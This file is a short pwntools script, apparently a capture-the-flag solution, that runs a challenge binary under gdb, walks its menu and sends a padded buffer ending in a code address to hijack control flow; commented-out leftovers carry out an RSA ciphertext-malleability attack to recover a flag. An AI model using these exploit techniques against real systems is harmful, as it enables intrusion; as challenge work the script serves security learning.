from pwn import *

# conn = remote('challenges.404ctf.fr',30944)
conn = process("gdb")
conn.sendlineafter("gdb-peda$ ", "file l_alchimiste")
conn.sendlineafter("gdb-peda$ ", "b *0x400b10")
conn.sendlineafter("gdb-peda$ ", "b *0x400acc")
conn.sendlineafter("gdb-peda$ ", "r")
conn.sendlineafter(">>>", "1")
conn.sendlineafter(">>>", "2")
conn.sendlineafter(">>>", "1")
conn.sendlineafter(">>>", "2")
conn.sendlineafter(">>>", "1")
conn.sendlineafter(">>>", "2")
conn.sendlineafter(">>>", "3")
conn.sendafter("[Vous] :", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x10\x0b\x40\x00\x00\x00\x00\x00")
conn.sendlineafter(">>>", "2")
conn.interactive()






# cipher = int(conn.recvline().decode())

# conn.recvline()
# e = int(conn.recvline().decode().split(' ')[2])
# conn.recvline()
# conn.recvline()
# conn.recvline()

# # On déchiffre Enc(flag)*Enc(2), donc on déchiffre Enc(flag*2) !
# cc = str(cipher*(2**e)).encode()
# conn.sendline(cc)

# conn.recvline()

# tmodn = int(conn.recvline().decode())//2

# tmodn_byte = tmodn.to_bytes((tmodn.bit_length() + 7) // 8, 'big')

# print(tmodn_byte)